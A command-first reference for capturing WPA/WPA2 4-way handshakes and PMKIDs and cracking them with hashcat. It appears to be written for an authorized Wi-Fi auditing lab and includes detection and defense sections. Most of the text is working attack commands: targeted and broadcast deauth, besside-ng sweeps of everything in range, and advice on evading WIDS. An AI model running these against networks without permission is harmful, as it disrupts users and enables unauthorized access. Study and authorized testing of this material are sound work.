# WPA/WPA2 4-Way Handshake Capture — Command-First Reference

> **Scope & authorization.** This document is a knowledge base for a **local, allowlist-gated AUTHORIZED Wi-Fi auditing toolkit** — your own gear, a lab you own, sanctioned CTFs/competitions, or OSWP study. Every target BSSID must be on your written allowlist before any frame is transmitted. Deauth and association frames are *active* and legally meaningful; only emit them against networks you own or are explicitly authorized to test. Evil-twin material here is **detection + concept only** — there is deliberately **no credential-harvesting / captive-portal recipe**.
>
> Hardware assumed: **Mac** (hashcat / GPU cracking) + **Kali** (capture) + **TP-Link RTL8188EUS** USB adapter (2.4 GHz only). Companion cracking file: `./cracking/` and `./research/` in this command-center.

---

## 1. Concept (brief)

WPA/WPA2-PSK derives a **PMK** (Pairwise Master Key) from the passphrase + SSID via PBKDF2:
`PMK = PBKDF2(HMAC-SHA1, passphrase, SSID, 4096, 256)`.

The **4-way handshake** proves both sides know the PMK *without sending it*. It exchanges four EAPOL frames:

| Msg | Dir | Carries | Value to an auditor |
|-----|-----|---------|---------------------|
| **M1** | AP → STA | ANonce (AP nonce) | Gives ANonce; may contain **PMKID** (clientless win) |
| **M2** | STA → AP | SNonce + **MIC** | The crackable pair with M1 — MIC is keyed by PTK |
| **M3** | AP → STA | GTK + MIC | "Authorized" pair with M2 — most reliable |
| **M4** | STA → AP | MIC (ack) | Confirms; M1+M4 is weakest pair |

From ANonce + SNonce + both MACs you derive the **PTK**; the **MIC** on M2/M3 is what you test password guesses against **offline**. You only need the right EAPOL *message pair* (plus the ESSID) — not the whole session.

**PMKID (clientless).** Many APs put a `PMKID = HMAC-SHA1(PMK, "PMK Name" | AP_MAC | STA_MAC)` in **M1** of the RSN handshake. Capturing M1 alone — no client, no deauth — yields a crackable hash. Discovered by Jens "atom" Steube (hashcat) in Aug 2018 while analyzing WPA3; hashcat hash-mode was `16800`, now folded into **`22000`**. Not all APs/vendors emit it, and some emit a PMKID that won't crack, so treat it as "try first, fall back to EAPOL."

**Modern target format = hashcat `22000`** (`WPA-PBKDF2-PMKID+EAPOL`), a single text `.hc22000` that holds **both** PMKID (`WPA*01*`) and EAPOL (`WPA*02*`) lines. The old `.cap`/`.hccapx` (modes 2500/16800) are deprecated; `.cap` can be converted, `.hccapx` **cannot**.

---

## 2. Pre-flight (every session)

```bash
# 0. Confirm the target BSSID(s) are on the allowlist BEFORE anything transmits.
#    (allowlist gate is the toolkit's job — this doc assumes it passed.)

# 1. Identify the adapter (RTL8188EUS shows as wlan1/wlan0 depending on order)
iw dev
airmon-ng                         # lists wifi interfaces + drivers

# 2. RTL8188EUS needs the aircrack-ng rtl8188eus driver for monitor+injection.
#    Stock driver = NO monitor mode. If monitor fails, rebuild the DKMS driver
#    (and rebuild again after any kernel update — a common silent breakage).

# 3. Kill interfering services (NetworkManager/wpa_supplicant fight monitor mode)
sudo airmon-ng check kill

# 4. Enter monitor mode
sudo airmon-ng start wlan1        # creates wlan1mon (name varies by version)
iwconfig                          # confirm "Mode:Monitor"

# 5. Verify injection works (optional but saves time later)
sudo aireplay-ng --test wlan1mon
```

> When done: `sudo airmon-ng stop wlan1mon && sudo systemctl start NetworkManager`.

---

## 3. Decision order — the order pros actually try things

This is the fast path from "card is up" to "valid `.hc22000` in hand":

1. **Scan & pick the target** (`airodump-ng`), note **BSSID + channel + whether clients are associated**.
2. **Try PMKID first (clientless, quietest).** `hcxdumptool` targeted at the BSSID. If a PMKID lands in seconds, you may be done — no deauth, no client needed. Least disruptive = least detectable = first choice on a live/authorized production AP.
3. **If no PMKID → targeted EAPOL capture.** Lock `airodump-ng` to the channel+BSSID, write to disk.
   - **Client present?** Send a *small targeted* deauth to one client, wait, watch for `WPA handshake`.
   - **No client / quiet AP?** Wait for a natural reconnect, or capture at a busier time of day. Deauth with no client to kick accomplishes nothing against an idle AP.
4. **Verify the handshake is real** *before* you pack up (tshark/aircrack-ng/hcxpcapngtool). Re-capturing later is expensive; verifying on-site is cheap.
5. **Convert → `22000` → crack on the Mac GPU** (hashcat). Keep EAPOL *and* PMKID lines; crack whichever lands.
6. **Automation shortcut:** `wifite` (orchestrates 2–5) or `besside-ng` (logs all WPA handshakes in range) when you have many authorized targets. Use after you understand the manual flow so you can debug when it stalls.

Rule of thumb: **quietest technique that works wins** (PMKID > targeted single-client deauth > broadcast deauth). Broadcast deauth is loud, trips WIDS/WIPS in seconds, and is a last resort.

---

## 4. Technique A — airodump-ng (manual, targeted) — the canonical method

### 4a. Scan to find the target

```bash
sudo airodump-ng wlan1mon                 # 2.4GHz hop; note BSSID, CH, ENC, #Data, clients
# RTL8188EUS is 2.4GHz-only; to scan a band explicitly:
sudo airodump-ng --band bg wlan1mon
```

Read the two panes: **top** = APs (BSSID, PWR, CH, ENC=WPA2, ESSID); **bottom** = STATIONs (clients) and which BSSID they're associated with. A target **with an associated client** is far easier.

### 4b. Lock channel + BSSID and write to disk

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan1mon
#   -c 6              lock to channel (STOP hopping — critical, you miss frames while hopping)
#   --bssid <mac>     capture only the target AP
#   -w capture        output prefix -> capture-01.cap / .csv / .netxml
```

Leave this running. **Top-right** shows `WPA handshake: AA:BB:CC:DD:EE:FF` the moment a full handshake is seen.

### 4c. Force a reconnect (targeted deauth) — only if a client is associated

In a **second terminal**:

```bash
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan1mon
#   -0 3        deauth, 3 rounds (each round = frames to AP AND client). Small on purpose.
#   -a <bssid>  the AP
#   -c <client> ONE specific client (targeted = quiet, effective)
```

- **Targeted (`-c`) beats broadcast.** A burst of **3–5** is usually enough. More than ~10 just adds noise and can *prevent* the handshake by never letting the client finish reassociating.
- **Give it time between bursts.** Deauth → wait several seconds → check airodump → repeat only if needed. Hammering continuously starves the 4-way exchange.
- **Broadcast deauth** (omit `-c`, or `-c FF:FF:FF:FF:FF:FF`) is loud and WIDS-visible; use only when you can't enumerate a client and you're authorized for the noise.
- **PMF (802.11w) / WPA3:** deauth is cryptographically rejected — it simply won't work. Pivot to PMKID or wait for a natural association.

### 4d. Confirm and crack

```bash
aircrack-ng capture-01.cap                 # look for "(1 handshake)" next to the ESSID
# Quick dictionary sanity check (small list) — real cracking goes to the Mac GPU:
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

See §7 for proper verification and §8 for the `22000` conversion for hashcat.

---

## 5. Technique B — PMKID, clientless (hcxdumptool + hcxpcapngtool)

The **quietest** capture: no client and (ideally) no deauth. This is the modern first move. Authored by ZerBea; pairs with the hashcat `22000` workflow directly.

> **Version caution:** hcxdumptool syntax changed significantly at **6.3.0** (and again toward 7.x). Flags below reflect recent 6.3.x. **Always run `hcxdumptool -h` / `hcxdumptool --help` on your installed build** — older guides use `--enable_status`, `--filterlist_ap`, `--filtermode` which are renamed/removed. `--enable_status` → `--rds`; `--disable_client_attacks` → `--attemptclientmax`. hcxdumptool manages the interface itself — **do not** pre-set monitor mode with airmon-ng for it, and don't point it at a virtual interface.

### 5a. Capture (per the hashcat wiki workflow)

```bash
# hashcat wiki's canonical sequence:
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service

sudo hcxdumptool -i wlan1 -w dumpfile.pcapng --rds=1 -F
#   -i wlan1        raw interface (NOT wlan1mon)
#   -w dumpfile.pcapng   output (pcapng keeps nonces/replay-counters/metadata)
#   --rds=1         real-time display / status
#   -F              use all available channels (frequencies)
# Ctrl-C to stop.

sudo systemctl start wpa_supplicant.service
sudo systemctl start NetworkManager.service
```

To **target a single allowlisted AP** and stay quiet, use the current build's filter option (check `-h`; recent builds use a BPF-style/`--bpf` or `-c <channel>` focus). On modern hcxdumptool the tool is **interactive by default** — it responds to targets and requests missing frames — so to approach "passive," you disable its active behaviors (e.g. `--disable_deauthentication`, and on some builds `--disable_beacon`) and verify in Wireshark. It is never perfectly passive.

### 5b. Convert to hashcat 22000

```bash
hcxpcapngtool -o hash.hc22000 dumpfile.pcapng
#   emits WPA*01* (PMKID) and WPA*02* (EAPOL) lines; also prints a summary of what it found
```

### 5c. Hard rules from the hashcat wiki (these break captures silently)

- **Don't** set monitor mode with third-party tools for hcxdumptool; **don't** run it on a virtual interface.
- **Don't** run other tools that seize the interface while capturing (Wireshark/tshark reading is fine).
- **Don't** use filtering that drops needed frames while *collecting*.
- **Don't** `wpaclean` the dump and **don't** merge pcapng files — both strip nonces/metadata `hcxpcapngtool` needs.
- If the dump is huge, reduce with `tshark`, not wpaclean.

---

## 6. Technique C — wifite (automation that orchestrates the above)

`wifite` wraps airodump-ng + aireplay-ng + hcxdumptool + aircrack/hashcat. Best for sweeping multiple authorized targets. Capture-on-by-default; it validates with tshark/cowpatty/aircrack-ng.

```bash
sudo wifite                                    # interactive: scan, pick targets, auto-attack
sudo wifite -i wlan1mon -c 6 --wpa             # WPA/WPA2 only, lock channel 6
sudo wifite --clients-only                     # only show APs that have clients (easier HS)
sudo wifite --pmkid                            # PMKID-only, skip WPS/other
sudo wifite --no-pmkid                         # force EAPOL handshake path
sudo wifite --pmkid-timeout 300                # seconds to wait for a PMKID (default 300)
sudo wifite --nodeauths                        # PASSIVE: never deauth (default is to deauth)
sudo wifite --new-hs                           # capture fresh handshakes, ignore ones in hs/
sudo wifite --skip-crack                       # capture only, crack later on the Mac GPU
sudo wifite --dict /path/wordlist.txt          # custom wordlist
```

Validation / reuse of existing captures:

```bash
sudo wifite --check hs/handshake_xxx.cap       # validate a .cap holds a real handshake
sudo wifite --check                            # validate all hs/*.cap
sudo wifite --crack                            # show crack commands for captured files
sudo wifite --cracked                          # list previously cracked APs
```

Useful selectors: `-c 1,3-6` (channels), `--pow 50` (min signal), `--first N` (top N targets), `--ignore-cracked`.

> Note: upstream is kimocoder's `wifite2` (the Kali package). Flag names drift between forks and versions — confirm with `wifite -h`.

---

## 7. Technique D — besside-ng (fire-and-forget WPA logging)

From the aircrack-ng suite. Walks every network in range and **logs all WPA handshakes** it sees to `wpa.cap` (cracks WEP inline; for WPA it captures and logs).

```bash
sudo besside-ng wlan1mon                        # attack everything in range (authorized only!)
sudo besside-ng -b AA:BB:CC:DD:EE:FF wlan1mon   # single target BSSID
sudo besside-ng -c 6 wlan1mon                   # lock to channel 6
sudo besside-ng -W wlan1mon                     # WPA networks only
sudo besside-ng -b <mac> -c 6 -v wlan1mon       # verbose, targeted
#   handshakes -> ./wpa.cap ; log -> ./besside.log
```

- `-p <pps>` tunes flood rate; `-s <server>` is the upload-to-cracking-service option — **leave it off** for private/authorized work (don't exfiltrate client material).
- `besside-ng-crawler <dir> <out>` filters EAPOL frames out of a directory of caps — handy to consolidate a session's handshakes.
- Because it auto-deauths across *everything in range*, besside-ng is only appropriate when **every** AP in range is on your allowlist (a true isolated lab). Otherwise target with `-b`.

---

## 8. Technique E — bettercap (recon + handshake/PMKID in one session)

`bettercap`'s `wifi` module does discovery + EAPOL/PMKID capture together; good for scripted/caplet runs. Uses the **raw** interface.

```bash
sudo bettercap -iface wlan1
```

Inside the interactive session:

```text
# Recon + capture
set wifi.handshakes.file /root/handshakes.pcap   # where handshakes are saved
set wifi.handshakes.aggregate false              # false = per-network pcap files (easier triage)
wifi.recon on                                     # start 802.11 discovery + handshake/PMKID capture
wifi.recon.channel 6                              # pin channel(s), e.g. 1,6,11 — stops lossy hopping
wifi.recon AA:BB:CC:DD:EE:FF                       # filter to one allowlisted BSSID
wifi.show                                          # list discovered APs/clients

# PMKID (clientless association)
wifi.assoc AA:BB:CC:DD:EE:FF                        # request RSN PMKID from the AP

# Targeted deauth (authorized; small)
wifi.deauth AA:BB:CC:DD:EE:FF                       # deauth clients of this BSSID
```

Key params (defaults): `wifi.handshakes.file = ~/bettercap-wifi-handshakes.pcap`, `wifi.handshakes.aggregate = true`, `wifi.hop.period = 250` (ms/channel), `wifi.deauth.open = true`, `wifi.deauth.acquired = false` (skip APs already captured), `wifi.rssi.min = -200`, `wifi.txpower = 30`, `wifi.region = BO`.

- `wifi.deauth.skip`/`wifi.assoc.skip` = comma-separated BSSIDs to **never** touch — use this as a secondary safety net to keep off-allowlist neighbors untouched.
- The official docs' wording on deauth BSSID-vs-client scope is known to be inverted — verify behavior on your build before relying on scope.
- Convert bettercap's pcap with `hcxpcapngtool -o hash.hc22000 handshakes.pcap` (modern) rather than the old `cap2hccapx`.

---

## 9. Verifying a VALID handshake (do this before you leave)

Tools disagree, and "valid per tool X" has still failed to crack. Check the **raw EAPOL message pairs**, not just a green light.

### 9a. Wireshark / tshark — look at the actual frames

```bash
tshark -r capture-01.cap -Y "eapol"             # list EAPOL frames (want M1..M4 for the pair)
# In Wireshark GUI: filter  eapol   — inspect "Key Information" / message numbers.
```

- **Best pair = M2+M3** ("authorized"); **M1+M2** (challenge) also cracks. **M1+M4** only works if the client's nonce wasn't zeroed.
- Confirm **ANonce (M1)** and a **MIC-bearing M2/M3** share the same **replay counter** and MACs — mismatched replay counters = different handshake attempts stitched together = won't crack.

### 9b. aircrack-ng

```bash
aircrack-ng capture-01.cap                       # prints "(N handshake)" per ESSID with a HS
```

### 9c. cowpatty / pyrit (cross-check; optional)

```bash
cowpatty -r capture-01.cap -c                    # integrity check for a 4-way handshake
pyrit -r capture-01.cap analyze                  # report valid handshakes
pyrit -r capture-01.cap -o clean.cap strip       # isolate just the handshake frames
```

### 9d. hcxpcapngtool is itself the best validator

Its conversion summary tells you exactly what's usable, and the **`.hc22000` line format** encodes validity:

```text
WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***MESSAGEPAIR          # PMKID
WPA*02*MIC*MAC_AP*MAC_CLIENT*ESSID*NONCE_AP*EAPOL_CLIENT*MESSAGEPAIR   # EAPOL
```

Message-pair **bitmask** (low bits of the final field) — what pros read:
- `000` = M1+M2 (challenge), `001` = M1+M4 (only if client nonce not zeroed), `010` = M2+M3 (authorized).
- **bit 4** set = AP-less / against-a-client capture.
- **bits 5/6** = little/big-endian router → needs **nonce-error-correction**.
- **bit 7** set = replay counter **not** checked → nonce-error-correction is **mandatory** (hashcat does this; it means the pair is "best-effort").

Filter a mixed hash file:

```bash
hcxhashtool -i hash.hc22000 --type=1 -o pmkid.hc22000        # PMKID only
hcxhashtool -i hash.hc22000 --type=2 -o eapol.hc22000        # EAPOL only
hcxhashtool -i hash.hc22000 --authorized -o authorized.hc22000  # M2+M3 (strongest)
```

---

## 10. Convert & crack on the Mac GPU (hashcat 22000)

```bash
# On Kali (or Mac if hcxtools installed): convert capture -> 22000
hcxpcapngtool -o hash.hc22000 dumpfile.pcapng
# from a legacy .cap:  hcxpcapngtool -o hash.hc22000 capture-01.cap

# On the Mac (hashcat, GPU):
hashcat -m 22000 hash.hc22000 wordlist.txt                       # dictionary
hashcat -m 22000 hash.hc22000 -r rules/best64.rule wordlist.txt  # dict + rules
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d               # mask: 8 digits
hashcat -m 22000 hash.hc22000 --show                             # show cracked
```

- `22000` = `WPA-PBKDF2-PMKID+EAPOL` (recovers an 8–63 char PSK). `22001` = verify a known 64-hex PMK.
- WPA keyspace is **≥ 8 chars** — tailor masks/wordlists to that (no 7-char runs). PBKDF2's 4096 iterations make WPA *slow per guess*, so **smart wordlists + rules + targeted masks beat brute force**. Estimate mask runtime (`--keyspace` × your H/s) before launching a multi-day job.
- Tier the crack (your toolkit's design): phone numbers / dates / `?d{8,10}` / common ISP-default patterns first, then rockyou+rules, then larger masks.

---

## 11. Busy vs quiet APs — capture strategy

| Situation | Problem | Play |
|-----------|---------|------|
| **Busy AP, many clients** | Easy handshakes, but also noisy; WIDS watching | PMKID first; if EAPOL, a single targeted `-0 3` on one active client, then stop |
| **Quiet AP, 1 idle client** | Client rarely re-auths | One gentle targeted deauth, wait 10–20s, repeat sparingly; or PMKID |
| **Quiet AP, NO clients** | Nothing to deauth; no EAPOL will ever appear | **PMKID only** — deauth is pointless. If no PMKID, return at a busier time of day |
| **Channel keeps changing / lost frames** | airodump hopping, or band-steering AP | **Lock `-c`**; capture while *not* hopping; watch for the AP moving 2.4↔5 GHz |
| **PMF/WPA3 AP** | Deauth rejected | PMKID or passive wait; for pure WPA3-SAE, offline capture doesn't help (see §13) |

- **Don't hop while capturing EAPOL.** airodump-ng by default changes channel many times per second; you'll miss frames of a 4-way that completes in milliseconds. `-c` is mandatory for targeted work.
- **Timing of day matters** more than tool choice for quiet networks — clients associate on arrival (mornings) and after outages.

---

## 12. Gotchas & pitfalls (these waste the most time)

1. **Monitor mode silently dies after a kernel update** (RTL8188EUS DKMS driver) — rebuild the aircrack-ng rtl8188eus driver after `apt upgrade`.
2. **NetworkManager/wpa_supplicant steal the interface** — always `airmon-ng check kill` first (but *restart* them afterward for normal use).
3. **Hopping during capture** — forgetting `-c` is the #1 "why no handshake?" cause.
4. **Over-deauthing** — too many/too-frequent deauths prevent the client from ever completing the 4-way. Small bursts, then wait.
5. **`wpaclean` / merging pcapng** destroys nonces/replay metadata hcxpcapngtool needs — never clean before converting to 22000.
6. **Old `.hccapx` can't convert to 22000** — if you have legacy captures, re-capture rather than fight it.
7. **"Valid handshake" that won't crack** — mismatched replay counters, zeroed nonces (M1+M4), or junk EAPOL from unrelated handhelds. Prefer M2+M3; capture *several* handshakes.
8. **PMKID absent** — not all APs/vendors emit a (crackable) PMKID; absence ≠ you did it wrong. Fall back to EAPOL.
9. **hcxdumptool is NOT passive by default** — it transmits beacons/requests. If "quiet" matters, disable its active behaviors and verify in Wireshark; don't assume.
10. **Deprecated flags in old blogs** — hcxdumptool ≥6.3 renamed options; wifite forks differ; bettercap defaults changed. Trust `--help` over any tutorial, this one included.
11. **5 GHz / 802.11ac targets** — the RTL8188EUS is **2.4 GHz-only**; a 5 GHz-only or band-steered AP is invisible to it. Plan a dual-band adapter for those, or capture when the AP's 2.4 GHz radio is used.
12. **Wrong ESSID in the hash** — PMK binds to the exact SSID string; hidden/renamed SSIDs or trailing spaces break cracking. Confirm the ESSID the tool recorded.

---

## 13. Pro tips for speed

- **PMKID-first, always.** One frame, no client, no deauth — fastest and quietest when it works.
- **Capture once, crack on the Mac.** Keep Kali for RF work; move the `.hc22000` to the GPU box. Don't crack on the Pi/VM.
- **Keep EAPOL + PMKID in the same `.hc22000`** and let hashcat crack whichever is weaker; both share the PSK.
- **Lock the channel, pin the BSSID** — eliminates 90% of "intermittent capture" pain.
- **One targeted deauth beats a broadcast storm** — faster handshake, less WIDS noise, often a single `-0 2`/`-0 3` is enough.
- **Batch authorized targets** with `wifite --clients-only --skip-crack` to grab many handshakes in one pass, then crack offline.
- **Pre-build a tiered wordlist/mask plan** (defaults, dates, `?d{8,10}`, ISP patterns) so cracking starts the instant capture lands.
- **Verify on-site** (tshark/aircrack-ng) so you never discover a dead capture back at the desk.

---

## 14. Evil twin — DETECTION + concept only (no harvester)

**Concept (for defense understanding).** An evil twin clones a real network's SSID (and often BSSID/security) so clients associate to the attacker's AP. In an *authorized handshake* context, a same-SSID AP can only observe that a client's 4-way handshake **won't complete without the real PSK** — the twin learns nothing it can crack from a failed association. The dangerous evil-twin variants (credential/captive-portal phishing via tools like eaphammer/wifiphisher/airbase-ng) are **out of scope** for this toolkit; we do not build or document credential capture.

**What we DO build: detection.**

- **nzyme** — purpose-built evil-twin/rogue-AP detection. Baseline your **own** SSIDs+BSSIDs; it flags impersonators and can **trilaterate** a suspect AP's physical location across multiple sensors (an impersonator copies SSID/BSSID/security but not your hardware, firmware, or location).
- **Kismet** — WIDS mode with fingerprint/trend alerts; detects spoofed/evil-twin and KARMA-style attacks. **Gap to plan for:** it won't catch an attacker that *also* spoofs the MAC. Best stationary, not while wardriving. Export device lists via its REST API (change the default `kismet:kismet` creds immediately) and diff against an authorized AP inventory.
- **Detection signals to watch:** two BSSIDs advertising one SSID; a known SSID appearing on an unexpected channel/BSSID; sudden signal-strength/location anomalies; unexpected deauth floods (often the precursor that herds clients to a twin).

---

## 15. WPA3 / SAE — why offline capture doesn't apply

- **SAE (Dragonfly)** is a password-authenticated key exchange. A captured SAE handshake gives **nothing to test guesses against offline** — the derived PMK has far higher entropy than the password, and each guess requires an **active** connection to the AP, making large-scale offline cracking infeasible. The discrete-log hardness means you can guess the password element but can't recover the random secrets behind it.
- **WPA3 requires PMF (802.11w)** → forged deauth/disassoc are rejected → the classic "deauth to force a handshake" doesn't work.
- **Two real weak points (awareness, not a recipe):**
  1. **Transition mode** (WPA3/WPA2 mixed) — a client can be **downgraded to WPA2-PSK**, where the ordinary offline attack applies. *Defense: disable transition mode where feasible; use WPA3-only SSIDs for sensitive networks.*
  2. **Dragonblood (2019, Vanhoef & Ronen)** — timing/cache **side-channels in some implementations** (not the standard) enabled offline brute force on vulnerable firmware. *Defense: patch AP/client firmware; these were implementation bugs.*
- **Practical takeaway for your lab:** your RTL8188EUS + handshake-capture workflow is a **WPA/WPA2-PSK** story. For WPA3 targets, the auditor's job shifts to **config review + firmware patch level + transition-mode check**, not offline cracking.

---

## 16. DEFENSE (pair every attack above with this)

| Capture technique it stops | Defense |
|----------------------------|---------|
| Any offline PSK crack | **Long, high-entropy passphrase.** PBKDF2 can't save a weak PSK; 20+ random chars makes any wordlist/mask attack hopeless. Avoid ISP-default and pattern passwords (the first thing a tiered crack tries). |
| PMKID (clientless) | Where supported, **disable PMKID caching / "fast roaming" on standalone APs** that don't need 802.11r; prefer gear that doesn't emit PMKID. It only ever helps if the PSK is weak — so defense #1 dominates. |
| Deauth-forced handshake | **Enable PMF / 802.11w (Required, not just Optional).** Protects deauth/disassoc frames; WPA3 mandates it. Note: in WPA2+PMF-Optional transition, non-PMF clients can still be deauthed — require PMF to fully close it. |
| EAPOL/handshake value entirely | **Move to WPA3-SAE** (and avoid transition mode for sensitive SSIDs) — removes offline crackability of captured handshakes. Keep **AP + client firmware patched** (Dragonblood). |
| Evil twin / rogue AP | **WIDS/WIPS** (nzyme, Kismet) with an **authorized SSID+BSSID baseline**; alert on same-SSID/new-BSSID, unexpected channels, deauth floods, location anomalies. **802.1X/EAP** (enterprise) instead of PSK where possible; client-side server-cert validation to resist twins. |
| Reconnaissance generally | **Reduce TX power / shape coverage** to the physical footprint; segment/VLAN the WLAN; monitor for monitor-mode-driven deauth bursts as an early-warning signal. |

**One-line summary:** a strong passphrase defeats the *crack*; PMF/WPA3 defeats the *capture*; a WIDS baseline defeats the *twin*. Layer all three.

---

## 17. Sources

Official tool docs / wikis / man pages:
- hashcat wiki — *Cracking WPA/WPA2* (22000 workflow, hc22000 format, message-pair bitmask, capture rules): https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
- hashcat forum — original PMKID attack thread (atom/Steube, hash-mode 16800): https://hashcat.net/forum/thread-7717.html
- hashcat forum — *Plugins 2500/2501 and 16800/16801 are deprecated* (→ 22000 since 6.0.0): https://hashcat.net/forum/thread-10253.html
- aircrack-ng.org — Newbie Guide (airmon-ng/airodump-ng/aireplay-ng/aircrack-ng syntax): https://www.aircrack-ng.org/doku.php?id=newbie_guide
- besside-ng man page (Debian): https://manpages.debian.org/testing/aircrack-ng/besside-ng.8.en.html
- ZerBea hcxdumptool (GitHub + syntax-change discussions): https://github.com/ZerBea/hcxdumptool and https://github.com/ZerBea/hcxdumptool/discussions/330
- ZerBea hcxtools (README, hcxpcapngtool/hcxhashtool): https://github.com/ZerBea/hcxtools
- hcxdumptool man page (Debian): https://manpages.debian.org/testing/hcxdumptool/hcxdumptool.1
- bettercap — official wifi module reference (commands + parameter defaults): https://www.bettercap.org/modules/wifi/
- Kali tools — wifite (options): https://www.kali.org/tools/wifite/

Security research / blogs / writeups:
- Vanhoef & Ronen — *Dragonblood: Attacking the Dragonfly Handshake of WPA3*: https://papers.mathyvanhoef.com/dragonblood.pdf (Black Hat USA-19: https://i.blackhat.com/USA-19/Wednesday/us-19-Vanhoef-Dragonblood-Attacking-The-Dragonfly-Handshake-Of-WPA3-wp.pdf)
- evilsocket — *Pwning WPA/WPA2 Networks with bettercap and the PMKID Client-Less Attack*: https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/
- HackTricks — *Pentesting Wifi* (handshake/PMKID methodology, evil-twin concept): https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi
- Black Hills InfoSec — *Hunt for Weak Spots … with Airodump-ng* (channel-hopping behavior): https://www.blackhillsinfosec.com/hunt-for-weak-spots-in-your-wireless-network-with-airodump-ng/
- InfoSec Institute — *WiFi hack: WPA/WPA2 / WPA3 with Aircrack-ng* walkthrough: https://www.infosecinstitute.com/resources/hacking/wifi-hack-wpa-wpa2/

Defense / detection / standards:
- Espressif ESP-IDF — *Wi-Fi Security* (PMF/802.11w, WPA3 required-PMF behavior): https://docs.espressif.com/projects/esp-idf/en/v5.1/esp32s3/api-guides/wifi-security.html
- nzyme — wireless capabilities (rogue-AP vs evil-twin detection, trilateration): https://www.nzyme.org/capabilities/wireless
- Kismet — WIDS alerts documentation (evil-twin/KARMA detection + MAC-spoof gap): https://kismetwireless.net/docs/readme/alerts/alerts/

Hardware:
- aircrack-ng rtl8188eus driver (monitor mode + injection for TP-Link RTL8188EUS/WN722N v2/v3): https://github.com/aircrack-ng/rtl8188eus

---

*Authorized testing only. Every BSSID on the allowlist, every session logged. Quietest technique that works wins.*
